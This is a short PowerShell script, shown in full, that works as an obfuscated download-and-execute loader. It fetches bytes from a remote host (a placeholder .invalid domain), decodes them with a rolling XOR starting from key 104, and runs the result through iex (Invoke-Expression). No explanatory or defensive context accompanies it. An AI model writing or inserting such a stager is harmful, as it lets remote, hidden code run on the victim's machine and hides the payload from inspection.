$bytes = (New-Object Net.WebClient).DownloadData('http://qerrb.invalid/movement')

$prev = [byte] 104

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
